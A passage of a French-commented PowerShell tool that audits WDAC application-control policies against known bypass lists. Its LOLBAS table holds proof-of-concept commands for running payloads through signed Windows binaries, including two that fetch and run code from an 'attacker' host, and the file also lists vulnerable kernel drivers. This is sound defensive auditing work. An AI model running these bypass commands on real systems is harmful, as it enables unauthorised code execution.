<#
.SYNOPSIS
    Invoke-WDACAudit - Auditeur WDAC 

    Parse un ou plusieurs fichiers de politique WDAC (.xml issus de ConvertTo-WDACCodeIntegrityPolicy
    ou de CiPolicy Active), en extrait :
      * la liste de ce qui est AUTORISE (signers, hash, FilePath, FileName)
      * la liste de ce qui est INTERDIT (deny by hash / FileName, denied signers)
      * une DIFF technique par technique contre LOLBAS, LOLDrivers et bohops/UltimateWDACBypassList
        indiquant, pour chaque bypass connu, s'il est POSSIBLE ou BLOQUE et s'il faut ETRE ADMIN.


.USAGE
    .\Invoke-WDACAudit.ps1 -Path .\CIP42.xml
    .\Invoke-WDACAudit.ps1 -Path . -Folder
    .\Invoke-WDACAudit.ps1 -Path . -Folder -Report .\WDAC-Audit.md
    .\Invoke-WDACAudit.ps1 -Path . -Folder -POC                # affiche les commandes POC
    .\Invoke-WDACAudit.ps1 -Path . -Folder -ShowAllowed        # dump complet allow/deny
    .\Invoke-WDACAudit.ps1 -Path . -Folder -UpdateLOLDrivers   # base BYOVD a jour (loldrivers.io)
    .\Invoke-WDACAudit.ps1 -Path . -Folder -Json .\audit.json  # export machine-lisible

.NOTES
    ASCII pur -> compatible Windows PowerShell 5.1 (pas de souci d'encodage).
    Sources references :
      LOLBAS      https://lolbas-project.github.io/
      LOLDrivers  https://www.loldrivers.io/
      bohops      https://github.com/bohops/UltimateWDACBypassList
      MS block    https://learn.microsoft.com/windows/security/application-security/application-control/app-control-for-business/design/applications-that-can-bypass-appcontrol
#>
param(
    [Parameter(Mandatory=$true)]
    [string]$Path,
    [switch]$Folder,
    [switch]$ShowAllowed,
    [switch]$POC,
    [string]$Report,
    [string]$Json,
    [switch]$UpdateLOLDrivers,
    [string]$LOLDriversUrl = "https://www.loldrivers.io/api/drivers.json",
    [switch]$NoAcl
)

$ErrorActionPreference = "Stop"
$bar  = "=" * 78
$dash = "-" * 78
$thin = "." * 78

# Buffer pour le rapport Markdown optionnel
$script:MD = New-Object System.Collections.Generic.List[string]
function W {
    param([string]$Text = "", [string]$Color = "Gray")
    Write-Host $Text -ForegroundColor $Color
    $script:MD.Add($Text)
}

# ============================================================================
#  HELPERS VERSION / CHEMINS / ACL
# ============================================================================

# "a.b.c.d" -> [int[]] (4 champs, complete par des 0). Robuste aux valeurs vides.
function ConvertTo-VerParts {
    param([string]$v)
    if ([string]::IsNullOrWhiteSpace($v)) { return $null }
    $p = @($v -split '\.' | ForEach-Object { [int]($_ -replace '[^0-9]','0') })
    while ($p.Count -lt 4) { $p += 0 }
    return ,$p[0..3]
}
# retourne -1/0/1
function Compare-Ver {
    param($a, $b)
    for ($i=0; $i -lt 4; $i++) {
        if ($a[$i] -lt $b[$i]) { return -1 }
        if ($a[$i] -gt $b[$i]) { return 1 }
    }
    return 0
}
$script:VER_SENTINELS = @("65535.65535.65535.65535","65355.65355.65355.65355")

# Classe une regle deny FileName : bloque-t-elle TOUTES les versions ou seulement une plage ?
#   Retour: @{ Scope = "ALL" | "BOUNDED"; Detail = "<texte>" }
function Get-DenyScope {
    param($rule)  # @{ Name; Min; Max }
    $min = $rule.Min; $max = $rule.Max
    $minSet = -not [string]::IsNullOrWhiteSpace($min) -and ($min -ne "0.0.0.0")
    $maxSet = -not [string]::IsNullOrWhiteSpace($max) -and ($script:VER_SENTINELS -notcontains $max)
    if (-not $minSet -and -not $maxSet) { return @{ Scope="ALL"; Detail="toutes versions" } }
    if ($maxSet -and -not $minSet) { return @{ Scope="BOUNDED"; Detail=("version <= {0} (une version > {0} contourne)" -f $max) } }
    if ($minSet -and -not $maxSet) { return @{ Scope="BOUNDED"; Detail=("version >= {0} (une version < {0} contourne)" -f $min) } }
    return @{ Scope="BOUNDED"; Detail=("version dans [{0} ; {1}] (hors plage contourne)" -f $min, $max) }
}

# Verdict deny pour un nom de fichier donne, en tenant compte des versions.
#   $denyRules : liste de @{ Name(lower); Min; Max }
#   Retour: @{ Blocked=$true/$false; Scope="ALL"|"BOUNDED"|"NONE"; Detail }
function Test-DenyByName {
    param([string]$name, $denyRules)
    $n = $name.ToLower()
    $matches = @($denyRules | Where-Object { $_.Name -eq $n })
    if ($matches.Count -eq 0) { return @{ Blocked=$false; Scope="NONE"; Detail="absent de la blocklist" } }
    # Si une seule regle couvre TOUTES les versions -> blocage ferme.
    foreach ($r in $matches) {
        $sc = Get-DenyScope $r
        if ($sc.Scope -eq "ALL") { return @{ Blocked=$true; Scope="ALL"; Detail="deny FileName (toutes versions)" } }
    }
    # Sinon uniquement des plages -> contournable par une version hors plage.
    $details = @($matches | ForEach-Object { (Get-DenyScope $_).Detail } | Select-Object -Unique)
    return @{ Blocked=$true; Scope="BOUNDED"; Detail=("deny partiel : " + ($details -join " ; ")) }
}

# Resout les variables d'environnement WDAC dans un FilePath.
function Resolve-WDACPath {
    param([string]$p)
    if ([string]::IsNullOrWhiteSpace($p)) { return $p }
    $sysDrive = if ($env:SystemDrive) { $env:SystemDrive } else { "C:" }
    $winDir   = if ($env:WINDIR) { $env:WINDIR } else { "C:\Windows" }
    $r = $p
    $map = @{
        '%OSDRIVE%'  = $sysDrive
        '%WINDIR%'   = $winDir
        '%SYSTEM32%' = (Join-Path $winDir "System32")
    }
    foreach ($k in $map.Keys) { $r = $r -replace [regex]::Escape($k), $map[$k].Replace('\','\\') }
    return $r
}

# Chemins notoirement inscriptibles par un utilisateur standard (heuristique offline).
$script:WRITABLE_HINTS = @(
    '\users\','\programdata\','\appdata\','\temp\','\tmp\','\windows\temp',
    '\tasks\','\downloads\','\public\','\$recycle','\perflogs'
)

# Teste si un FilePath allow est reellement inscriptible (ACL) ou heuristiquement suspect.
#   Retour: @{ State = ABSENT|WRITABLE|SAFE|HEURISTIC|ERROR ; By = "<sids>" ; Resolved }
function Test-WDACPathWritable {
    param([string]$filePath)
    $resolved = Resolve-WDACPath $filePath
    $low = $resolved.ToLower()
    $heur = $false
    foreach ($h in $script:WRITABLE_HINTS) { if ($low -like ("*" + $h + "*")) { $heur = $true; break } }

    # Reduit a un dossier testable (retire le wildcard et le nom de fichier final).
    $dir = $resolved
    $wild = $dir.IndexOfAny([char[]]@('*','?'))
    if ($wild -ge 0) { $dir = $dir.Substring(0, $wild) }
    if ($dir -match '\.[A-Za-z0-9]{1,5}$') { $dir = Split-Path $dir -Parent }  # enleve le fichier
    $dir = $dir.TrimEnd('\')

    $result = @{ State="ABSENT"; By=""; Resolved=$resolved; Dir=$dir; Heuristic=$heur }
    if ($NoAcl) { $result.State = if ($heur) { "HEURISTIC" } else { "SKIP" }; return $result }

    try {
        if (-not (Test-Path -LiteralPath $dir)) {
            $result.State = if ($heur) { "HEURISTIC" } else { "ABSENT" }
            return $result
        }
        $acl = Get-Acl -LiteralPath $dir
        $lowGroups = @('S-1-5-32-545','S-1-1-0','S-1-5-11')  # Users, Everyone, Authenticated Users
        $writeMask = [System.Security.AccessControl.FileSystemRights]::Write -bor `
                     [System.Security.AccessControl.FileSystemRights]::Modify -bor `
                     [System.Security.AccessControl.FileSystemRights]::FullControl -bor `
                     [System.Security.AccessControl.FileSystemRights]::CreateFiles -bor `
                     [System.Security.AccessControl.FileSystemRights]::CreateDirectories
        $who = @()
        foreach ($ace in $acl.Access) {
            if ($ace.AccessControlType -ne 'Allow') { continue }
            $sid = $null
            try { $sid = $ace.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]).Value } catch { $sid = $ace.IdentityReference.Value }
            if ($lowGroups -contains $sid) {
                if (([int]$ace.FileSystemRights -band [int]$writeMask) -ne 0) { $who += $ace.IdentityReference.Value }
            }
        }
        if ($who.Count -gt 0) { $result.State="WRITABLE"; $result.By=($who -join ", ") }
        else { $result.State= if ($heur) { "HEURISTIC" } else { "SAFE" } }
    } catch {
        $result.State = if ($heur) { "HEURISTIC" } else { "ERROR" }
    }
    return $result
}

# ============================================================================
#  BASES DE CONNAISSANCE
# ============================================================================

# --- LOLBAS : binaires signes Microsoft qui permettent d'executer du code ---
#     arbitraire (contournement du controle applicatif). "Kernel" = driver.
#     ATT = technique MITRE ATT&CK associee.
$LOLBAS = @(
    @{ File="MSBuild.exe";                    Admin=$false; Att="T1127.001"; Tech="Compile+exec tache C# inline (Csc/inline task)";
       POC="msbuild.exe C:\temp\payload.proj  # <Target><CSharpClass/inline task>" }
    @{ File="Microsoft.Workflow.Compiler.exe"; Admin=$false; Att="T1127"; Tech="Execute assembly via XOML/workflow";
       POC="Microsoft.Workflow.Compiler.exe payload.xml out.txt" }
    @{ File="InstallUtil.exe";                Admin=$false; Att="T1218.004"; Tech="Execute code dans Uninstall() d'un assembly .NET";
       POC="InstallUtil.exe /logfile= /LogToConsole=false /U C:\temp\payload.dll" }
    @{ File="RegSvcs.exe";                    Admin=$false; Att="T1218.009"; Tech="Charge assembly .NET (COM+)  [NON dans blocklist]";
       POC="RegSvcs.exe C:\temp\payload.dll" }
    @{ File="RegAsm.exe";                     Admin=$false; Att="T1218.009"; Tech="Charge assembly .NET  [NON dans blocklist]";
       POC="RegAsm.exe /U C:\temp\payload.dll" }
    @{ File="mshta.exe";                      Admin=$false; Att="T1218.005"; Tech="Execute HTA / JScript / VBScript";
       POC="mshta.exe C:\temp\payload.hta" }
    @{ File="wmic.exe";                       Admin=$false; Att="T1220"; Tech="XSL scriptlet via /format";
       POC="wmic.exe os get /format:'C:\temp\payload.xsl'" }
    @{ File="cscript.exe";                    Admin=$false; Att="T1216"; Tech="Execute VBScript/JScript";
       POC="cscript.exe //nologo C:\temp\payload.vbs" }
    @{ File="wscript.exe";                    Admin=$false; Att="T1216"; Tech="Execute VBScript/JScript";
       POC="wscript.exe C:\temp\payload.js" }
    @{ File="regsvr32.exe";                   Admin=$false; Att="T1218.010"; Tech="Squiblydoo : scrobj.dll scriptlet (COM)  [NON dans blocklist]";
       POC="regsvr32.exe /s /u /i:http://attacker/payload.sct scrobj.dll" }
    @{ File="rundll32.exe";                   Admin=$false; Att="T1218.011"; Tech="Charge DLL export / JS via mshtml  [NON dans blocklist]";
       POC="rundll32.exe C:\temp\payload.dll,EntryPoint" }
    @{ File="presentationhost.exe";           Admin=$false; Att="T1218"; Tech="Execute XBAP (.NET WPF browser app)  [NON dans blocklist]";
       POC="presentationhost.exe C:\temp\payload.xbap" }
    @{ File="cmstp.exe";                      Admin=$false; Att="T1218.003"; Tech="Execute INF/SCT (aussi bypass UAC)  [NON dans blocklist]";
       POC="cmstp.exe /au C:\temp\payload.inf" }
    @{ File="msxsl.exe";                      Admin=$false; Att="T1220"; Tech="XSLT scriptlet (outil MS a telecharger)  [NON dans blocklist]";
       POC="msxsl.exe input.xml payload.xsl" }
    @{ File="csi.exe";                        Admin=$false; Att="T1127"; Tech="C# interactive (Roslyn)";
       POC="csi.exe C:\temp\payload.csx" }
    @{ File="rcsi.exe";                       Admin=$false; Att="T1127"; Tech="C# interactive (Roslyn)";
       POC="rcsi.exe C:\temp\payload.csx" }
    @{ File="dnx.exe";                        Admin=$false; Att="T1127"; Tech="Execute projet .NET Core (DNX)";
       POC="dnx.exe C:\temp\proj run" }
    @{ File="dotnet.exe";                     Admin=$false; Att="T1218"; Tech="Build+run projet .NET";
       POC="dotnet.exe run --project C:\temp\proj" }
    @{ File="fsi.exe";                        Admin=$false; Att="T1127"; Tech="F# interactive";
       POC="fsi.exe C:\temp\payload.fsx" }
    @{ File="fsiAnyCpu.exe";                  Admin=$false; Att="T1127"; Tech="F# interactive";
       POC="fsiAnyCpu.exe C:\temp\payload.fsx" }
    @{ File="aspnet_compiler.exe";            Admin=$false; Att="T1127"; Tech="Compile+exec app ASP.NET";
       POC="aspnet_compiler.exe -v none -p C:\temp\site -f C:\temp\out" }
    @{ File="AddInProcess.exe";               Admin=$false; Att="T1218"; Tech="Charge add-in .NET (pipe)  [hors LOLBAS ; sur blocklist MS]";
       POC="AddInProcess.exe /guid:... /pid:..." }
    @{ File="InfDefaultInstall.exe";          Admin=$false; Att="T1218"; Tech="Execute section [RunPreSetupCommands] d'un .inf";
       POC="InfDefaultInstall.exe C:\temp\payload.inf" }
    @{ File="bash.exe";                       Admin=$false; Att="T1202"; Tech="Execute code Linux (WSL) hors WDAC user-mode";
       POC='bash.exe -c "curl http://attacker/x | bash"' }
    @{ File="wsl.exe";                        Admin=$false; Att="T1202"; Tech="Execute code Linux (WSL) hors WDAC user-mode";
       POC='wsl.exe -e /bin/bash -c "..."' }
    @{ File="runscripthelper.exe";            Admin=$false; Att="T1216"; Tech="Execute PowerShell via telemetrie";
       POC="runscripthelper.exe surfacecheck ... C:\temp\payload.txt" }
    @{ File="TextTransform.exe";              Admin=$false; Att="T1127"; Tech="Execute template T4 (C#)";
       POC="TextTransform.exe -out out.txt C:\temp\payload.tt" }
    @{ File="windbg.exe";                     Admin=$false; Att="T1127"; Tech="Debugger : injection shellcode";
       POC="windbg.exe -c '...' target.exe" }
    @{ File="cdb.exe";                        Admin=$false; Att="T1127"; Tech="Debugger console : exec shellcode/cdb script";
       POC="cdb.exe -cf C:\temp\payload.wds -o notepad.exe" }
    @{ File="kd.exe";                         Admin=$false; Att="T1127"; Tech="Kernel debugger (mode user aussi)";
       POC="kd.exe -cf C:\temp\payload.wds ..." }
    @{ File="ntsd.exe";                       Admin=$false; Att="T1127"; Tech="Debugger NT : exec shellcode";
       POC="ntsd.exe -cf C:\temp\payload.wds ..." }
    @{ File="powershell.exe";                 Admin=$false; Att="T1059.001"; Tech="Si UMCI actif -> Constrained Language Mode; sinon FullLanguage  [hors LOLBAS : shell natif]";
       POC="powershell.exe -ep bypass -f C:\temp\payload.ps1" }
)

# --- Blocklist recommandee Microsoft (extrait des noms les plus courants, lowercase) ---
#     Sert a la section [C] : lister ce qui MANQUE dans la politique auditee.
$MSBlockList = @(
    "addinprocess.exe","addinprocess32.exe","addinutil.exe","aspnet_compiler.exe","bash.exe",
    "bginfo.exe","cdb.exe","csi.exe","dbghost.exe","dbgsvc.exe","dnx.exe","dotnet.exe","fsi.exe",
    "fsianycpu.exe","infdefaultinstall.exe","installutil.exe","jsc.exe","kd.exe","ntkd.exe",
    "kill.exe","lxssmanager.dll","lxrun.exe","microsoft.build.dll","microsoft.workflow.compiler.exe",
    "msbuild.exe","msbuild.dll","mshta.exe","ntsd.exe","rcsi.exe","runscripthelper.exe",
    "texttransform.exe","visualuiaverifynative.exe","wfc.exe","windbg.exe","wmic.exe",
    "wsl.exe","wslconfig.exe","wslhost.exe","cscript.exe","wscript.exe","powershellcustomhost.exe"
    # NB: csc.exe / vbc.exe / cvtres.exe / presentationhost.exe RETIRES : ne figurent PAS sur la
    #     blocklist Microsoft officielle (gaps connus - a bloquer manuellement, mais ce ne sont pas
    #     des "recommandations MS" ; les garder ici produisait de faux MANQUANTS en section [C]).
) | Select-Object -Unique

# --- LOLDrivers : BYOVD (kernel, EXIGE ADMIN pour charger un service driver) ---
#     Base OFFLINE de secours. -UpdateLOLDrivers la remplace par loldrivers.io.
$LOLDrivers = @(
    @{ File="RTCore64.sys";      CVE="CVE-2019-16098"; Desc="MSI Afterburner - R/W kernel arbitraire"; Impact="CRITICAL"; Hashes=@() }
    @{ File="DBUtil_2_3.sys";    CVE="CVE-2021-21551"; Desc="Dell DBUtil - R/W kernel arbitraire"; Impact="CRITICAL"; Hashes=@() }
    @{ File="dbutildrv2.sys";    CVE="CVE-2021-36276"; Desc="Dell BIOSUtil - R/W kernel"; Impact="CRITICAL"; Hashes=@() }
    @{ File="gdrv.sys";          CVE="CVE-2018-19320"; Desc="Gigabyte - R/W kernel + MSR"; Impact="CRITICAL"; Hashes=@() }
    @{ File="GLCKIo2.sys";       CVE="CVE-2018-18537"; Desc="ASUS Aura Sync (GLCKIo) - write DWORD arbitraire kernel"; Impact="CRITICAL"; Hashes=@() }
    @{ File="WinRing0x64.sys";   CVE="CVE-2020-14979"; Desc="OpenLibSys - R/W MSR/port IO"; Impact="CRITICAL"; Hashes=@() }
    @{ File="PROCEXP152.sys";    CVE="N/A";            Desc="Process Explorer - terminate protected process"; Impact="HIGH"; Hashes=@() }
    @{ File="kprocesshacker.sys";CVE="N/A";            Desc="Process Hacker - terminer/injecter process"; Impact="HIGH"; Hashes=@() }
    @{ File="dbk64.sys";         CVE="N/A";            Desc="Cheat Engine (DBK) - R/W kernel"; Impact="CRITICAL"; Hashes=@() }
    @{ File="dbk32.sys";         CVE="N/A";            Desc="Cheat Engine (DBK) - R/W kernel"; Impact="CRITICAL"; Hashes=@() }
    @{ File="PCHunter.sys";      CVE="N/A";            Desc="PCHunter - kill EDR / R-W kernel"; Impact="CRITICAL"; Hashes=@() }
    @{ File="mhyprot2.sys";      CVE="CVE-2020-36603"; Desc="Genshin anticheat - kill process/R-W"; Impact="CRITICAL"; Hashes=@() }
    @{ File="viragt64.sys";      CVE="CVE-2017-16238"; Desc="TG Soft - R/W kernel"; Impact="CRITICAL"; Hashes=@() }
    @{ File="ArbLtd.sys";        CVE="N/A";            Desc="EneTechIo - R/W physique"; Impact="CRITICAL"; Hashes=@() }
) | Where-Object { $_.File.Trim() -ne "" }

# [G] Recuperation loldrivers.io (avec cache offline dans %TEMP%).
#     NB: le drivers.json (~32 Mo) contient des cles dupliquees insensibles a la casse
#     (init/INIT) qui font PLANTER ConvertFrom-Json de Windows PowerShell 5.1. On l'evite
#     via une extraction regex par objet (split sur "Tags"), robuste et suffisante ici.
function Update-LOLDriversDb {
    param([string]$Url)
    $cache = Join-Path $env:TEMP "loldrivers.cache.json"
    $content = $null
    try {
        W ("  [G] Telechargement LOLDrivers : {0}" -f $Url) "DarkGray"
        try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}
        $resp = Invoke-WebRequest -Uri $Url -TimeoutSec 40 -UseBasicParsing -ErrorAction Stop
        $content = $resp.Content
        try { Set-Content -Path $cache -Value $content -Encoding UTF8 } catch {}
    } catch {
        W ("  [G] Echec reseau ({0}) -> tentative cache local" -f $_.Exception.Message) "Yellow"
        if (Test-Path $cache) { try { $content = Get-Content $cache -Raw } catch {} }
    }
    if ([string]::IsNullOrWhiteSpace($content)) { W "  [G] Indisponible -> base offline conservee." "Yellow"; return $null }

    # Un objet driver commence par sa cle "Tags" ; on decoupe dessus pour isoler chaque entree.
    $reSys = [regex]'(?i)"([A-Za-z0-9_\-\.\ ]+\.sys)"'
    $reSha = [regex]'\b[A-Fa-f0-9]{64}\b'
    $reCve = [regex]'(?i)CVE-\d{4}-\d{3,7}'
    $reCat = [regex]'(?i)"Category"\s*:\s*"([^"]+)"'

    $list = New-Object System.Collections.Generic.List[object]
    $chunks = $content -split '"Tags"'
    for ($i=1; $i -lt $chunks.Count; $i++) {
        $chunk = $chunks[$i]
        $mName = $reSys.Match($chunk)
        if (-not $mName.Success) { continue }
        $name = $mName.Groups[1].Value.Trim()
        $hashes = @(); foreach ($h in $reSha.Matches($chunk)) { $hashes += $h.Value.ToUpper() }
        $cves   = @(); foreach ($c in $reCve.Matches($chunk)) { $cves += $c.Value.ToUpper() }
        $mCat = $reCat.Match($chunk)
        $cat = if ($mCat.Success) { $mCat.Groups[1].Value } else { "vulnerable driver" }
        $list.Add([ordered]@{
            File=$name
            CVE= if ($cves.Count -gt 0) { (@($cves | Select-Object -Unique) -join ", ") } else { "N/A" }
            Desc=("{0} (loldrivers.io)" -f $cat)
            Impact= if ($cat -match "(?i)malicious") { "MALICIOUS" } else { "CRITICAL" }
            Hashes=@($hashes | Select-Object -Unique)
        })
    }
    # Dedoublonne par nom de fichier (fusionne les hash).
    $byName = @{}
    foreach ($d in $list) {
        $k = $d.File.ToLower()
        if ($byName.ContainsKey($k)) {
            $byName[$k].Hashes = @(($byName[$k].Hashes + $d.Hashes) | Select-Object -Unique)
        } else { $byName[$k] = $d }
    }
    $final = @($byName.Values | Sort-Object { $_.File })
    $hashTotal = (@($final | ForEach-Object { $_.Hashes }) | Where-Object { $_ }).Count
    W ("  [G] LOLDrivers charge : {0} drivers .sys uniques, {1} hash." -f $final.Count, $hashTotal) "Green"
    if ($final.Count -eq 0) { return $null }
    return $final
}

# --- bohops / UltimateWDACBypassList : techniques (au dela des simples LOLBINs) ---
$Bohops = @(
    @{ Name="MSBuild inline task";            Admin=$false; Ref="bohops #1";
       Desc="msbuild.exe compile & execute une tache C# inline (pas de csc.exe requis)";
       Blk={ param($m) (Test-DenyByName "msbuild.exe" $m.EffDenyRules).Blocked } }
    @{ Name="Signed app + DLL side-load";     Admin=$false; Ref="MITRE T1574.002";
       Desc="Placer une DLL non signee a cote d'un EXE signe autorise (si dossier writable)";
       Blk={ param($m) $m.HasUMCI -and $m.EnforcedForUser } }
    @{ Name="Assembly.Load reflection (.NET)";Admin=$false; Ref="bohops managed";
       Desc="[Reflection.Assembly]::Load(bytes) depuis PowerShell/JS -> exec en memoire";
       Blk={ param($m) $m.HasUMCI -and $m.EnforcedForUser -and (-not $m.HasNoUMCIscriptGap) } }
    @{ Name="mshta / JScript / VBScript";     Admin=$false; Ref="bohops scripting";
       Desc="Execution de scriptlets via mshta.exe";
       Blk={ param($m) (Test-DenyByName "mshta.exe" $m.EffDenyRules).Blocked } }
    @{ Name="Regsvr32 Squiblydoo";            Admin=$false; Ref="LOLBAS/AppLocker";
       Desc="regsvr32 /i:url scrobj.dll -> execute un scriptlet COM distant";
       Blk={ param($m) (Test-DenyByName "regsvr32.exe" $m.EffDenyRules).Blocked } }
    @{ Name="cmstp INF exec";                 Admin=$false; Ref="LOLBAS/AppLocker";
       Desc="cmstp.exe execute des commandes via un .inf (aussi bypass UAC)";
       Blk={ param($m) (Test-DenyByName "cmstp.exe" $m.EffDenyRules).Blocked } }
    @{ Name="LOLBIN signe non bloque";        Admin=$false; Ref="bohops signed";
       Desc="Utiliser un binaire signe MS absent de la blocklist (rappel: renommer NE bypasse PAS un deny FileName qui lit l'OriginalFileName du PE)";
       Blk={ param($m) $false } }
    @{ Name="FilePath allow writable";        Admin=$false; Ref="bohops writable path";
       Desc="Deposer un payload dans un dossier autorise par regle FilePath et inscriptible (user)";
       Blk={ param($m) -not ($m.HasWritableAllowPath) } }
    @{ Name="Remplacer la politique (unsigned)";Admin=$true;  Ref="bohops policy tamper";
       Desc="Politique non signee -> admin remplace le .cip par un AllowAll (via CiTool)";
       Blk={ param($m) -not $m.HasUnsigned } }
    @{ Name="Supplemental AllowAll (No Reboot)";Admin=$true; Ref="bohops supplemental";
       Desc="Deployer une politique supplementaire malveillante, active sans reboot";
       Blk={ param($m) -not ($m.HasNoReboot -and $m.AllowSupplemental) } }
    @{ Name="BYOVD (driver vulnerable)";      Admin=$true;  Ref="LOLDrivers";
       Desc="Charger un driver signe vulnerable pour executer en kernel / tuer l'EDR";
       Blk={ param($m) $false } }
    @{ Name="Managed Installer tagging";      Admin=$false; Ref="bohops ISG/MI";
       Desc="Faire installer le payload par un managed installer -> binaire taggue trusted";
       Blk={ param($m) -not $m.HasManagedInstaller } }
    @{ Name="ISG reputation";                 Admin=$false; Ref="bohops ISG";
       Desc="Binaire 'known good' auto-autorise par la reputation cloud (SmartScreen/ISG)";
       Blk={ param($m) -not $m.HasISG } }
    @{ Name="WSL / bash";                     Admin=$false; Ref="bohops WSL";
       Desc="Executer du code Linux hors du perimetre WDAC user-mode";
       Blk={ param($m) (Test-DenyByName "wsl.exe" $m.EffDenyRules).Blocked -or (Test-DenyByName "bash.exe" $m.EffDenyRules).Blocked } }
)

# ============================================================================
#  PARSING D'UNE POLITIQUE -> MODELE
# ============================================================================
function Get-WDACModel {
    param([xml]$xml, [string]$fileName)

    $p = $xml.SiPolicy
    $m = [ordered]@{}
    $m.File        = $fileName
    $m.PolicyType  = $p.PolicyType
    $m.PolicyID    = $p.PolicyID
    $m.BasePolicyID= $p.BasePolicyID
    $m.Version     = $p.VersionEx
    $m.IsSupplemental = ($p.PolicyType -eq "Supplemental Policy")

    # -- Nom lisible (Settings PolicyInfo/Name) --
    $m.Name = "(sans nom)"
    if ($p.Settings.Setting) {
        foreach ($s in $p.Settings.Setting) {
            if ($s.ValueName -eq "Name" -and $s.Value.String) { $m.Name = $s.Value.String }
        }
    }

    # -- Options --
    $opts = @()
    if ($p.Rules.Rule) { foreach ($r in $p.Rules.Rule) { if ($r.Option) { $opts += $r.Option } } }
    $m.Options = $opts
    function HasOpt($pat) { return (@($opts | Where-Object { $_ -match $pat }).Count -gt 0) }

    $m.IsAudit           = HasOpt "Audit Mode"
    $m.HasUMCI           = HasOpt "Enabled:UMCI"
    $m.HasUnsigned       = HasOpt "Unsigned System Integrity"
    $m.HasNoReboot       = HasOpt "Update Policy No Reboot"
    $m.AllowSupplemental = HasOpt "Allow Supplemental"
    $m.HasManagedInstaller = HasOpt "Managed Installer"
    $m.HasISG            = HasOpt "Intelligent Security Graph"
    $m.HasBootMenu       = HasOpt "Advanced Boot Options Menu"
    $m.InheritDefault    = HasOpt "Inherit Default Policy"
    $m.HasNoUMCIscriptGap = (-not $m.HasUMCI)
    $m.EnforcedForUser   = ($m.HasUMCI -and -not $m.IsAudit)

    # -- Signers --
    $signers = @{}
    if ($p.Signers.Signer) {
        foreach ($s in $p.Signers.Signer) {
            $faRefs = @()
            if ($s.FileAttribRef) { foreach ($fr in $s.FileAttribRef) { $faRefs += $fr.RuleID } }
            $signers[$s.ID] = [ordered]@{
                ID=$s.ID; Name=$s.Name
                RootType=$s.CertRoot.Type; RootValue=$s.CertRoot.Value
                Publisher= $(if ($s.CertPublisher) { $s.CertPublisher.Value } else { $null })
                EKU=$(if ($s.CertEKU) { $s.CertEKU.ID } else { $null })
                FileAttribRefs=$faRefs
                Constrained=($faRefs.Count -gt 0)
            }
        }
    }
    $m.Signers = $signers

    # -- FileRules : Allow / Deny (hash, FileName+version, FilePath) --
    $allowHash=@(); $denyHash=@()
    $allowFileName=@(); $denyRules=@(); $allowFilePath=@(); $denyFilePath=@()
    if ($p.FileRules) {
        foreach ($c in $p.FileRules.ChildNodes) {
            $isDeny = ($c.LocalName -eq "Deny")
            $isAllow= ($c.LocalName -eq "Allow" -or $c.LocalName -eq "FileRule")
            if (-not ($isDeny -or $isAllow)) { continue }
            if ($c.Hash)     { if ($isDeny) { $denyHash += $c.Hash.ToUpper() } else { $allowHash += $c.Hash.ToUpper() } }
            if ($c.FileName) {
                if ($isDeny) {
                    $denyRules += [ordered]@{ Name=$c.FileName.ToLower(); Min=$c.MinimumFileVersion; Max=$c.MaximumFileVersion }
                } else { $allowFileName += $c.FileName }
            }
            if ($c.FilePath) { if ($isDeny) { $denyFilePath += $c.FilePath } else { $allowFilePath += $c.FilePath } }
        }
    }
    $m.AllowHashes    = @($allowHash | Select-Object -Unique)
    $m.DenyHashes     = @($denyHash  | Select-Object -Unique)
    $m.AllowHashCount = $m.AllowHashes.Count
    $m.DenyHashCount  = $m.DenyHashes.Count
    $m.AllowFileNames = @($allowFileName)
    $m.DenyRules      = @($denyRules)   # objets {Name;Min;Max}
    $m.DenyFileNames  = @($denyRules | ForEach-Object { $_.Name } | Select-Object -Unique)
    $m.AllowFilePaths = @($allowFilePath)
    $m.DenyFilePaths  = @($denyFilePath)

    # -- Scenarios : signers autorises / refuses (user-mode=12, kernel=131) --
    $allowedUser=@(); $allowedKernel=@(); $deniedAll=@()
    if ($p.SigningScenarios.SigningScenario) {
        foreach ($sc in $p.SigningScenarios.SigningScenario) {
            $isUser = ($sc.Value -eq "12")
            if ($sc.ProductSigners.AllowedSigners.AllowedSigner) {
                foreach ($a in $sc.ProductSigners.AllowedSigners.AllowedSigner) {
                    if ($isUser) { $allowedUser += $a.SignerId } else { $allowedKernel += $a.SignerId }
                }
            }
            if ($sc.ProductSigners.DeniedSigners.DeniedSigner) {
                foreach ($d in $sc.ProductSigners.DeniedSigners.DeniedSigner) { $deniedAll += $d.SignerId }
            }
        }
    }
    $m.AllowedUserSigners   = @($allowedUser   | Select-Object -Unique)
    $m.AllowedKernelSigners = @($allowedKernel | Select-Object -Unique)
    $m.DeniedSigners        = @($deniedAll     | Select-Object -Unique)

    $wide=@()
    foreach ($sid in $m.AllowedUserSigners) {
        if ($signers.ContainsKey($sid) -and -not $signers[$sid].Constrained) { $wide += $sid }
    }
    $m.PublisherWideSigners = @($wide | Select-Object -Unique)

    # Placeholders remplis lors du merge [A] :
    $m.EffDenyRules       = @($m.DenyRules)
    $m.EffAllowFilePaths  = @($m.AllowFilePaths)
    $m.EffAllowHashes     = @($m.AllowHashes)
    $m.Supplementals      = @()
    $m.WritablePaths      = @()
    $m.HasWritableAllowPath = $false

    return $m
}

# ============================================================================
#  [A] RESOLVEUR D'EFFET REEL : fusion base + supplementaux par BasePolicyID
# ============================================================================
function Merge-EffectivePolicies {
    param($models)
    $bases = @($models | Where-Object { -not $_.IsSupplemental })
    $supps = @($models | Where-Object { $_.IsSupplemental })
    foreach ($b in $bases) {
        $attached = @($supps | Where-Object { $_.BasePolicyID -eq $b.PolicyID })
        $b.Supplementals = @($attached)
        $effDeny = @($b.DenyRules)
        $effPaths= @($b.AllowFilePaths)
        $effHash = @($b.AllowHashes)
        foreach ($s in $attached) {
            $effDeny += $s.DenyRules
            $effPaths += $s.AllowFilePaths
            $effHash  += $s.AllowHashes
        }
        $b.EffDenyRules      = @($effDeny)
        $b.EffAllowFilePaths = @($effPaths | Select-Object -Unique)
        $b.EffAllowHashes    = @($effHash  | Select-Object -Unique)
    }
    # Les supplementaux heritent de l'enforcement de leur base (pour l'affichage).
    foreach ($s in $supps) {
        $base = $bases | Where-Object { $_.PolicyID -eq $s.BasePolicyID } | Select-Object -First 1
        $s.EffDenyRules = if ($base) { @($base.EffDenyRules) } else { @($s.DenyRules) }
    }
}

# ============================================================================
#  [D] Analyse des FilePath allow inscriptibles (sur la base effective)
# ============================================================================
function Resolve-WritablePaths {
    param($m)
    $out = @()
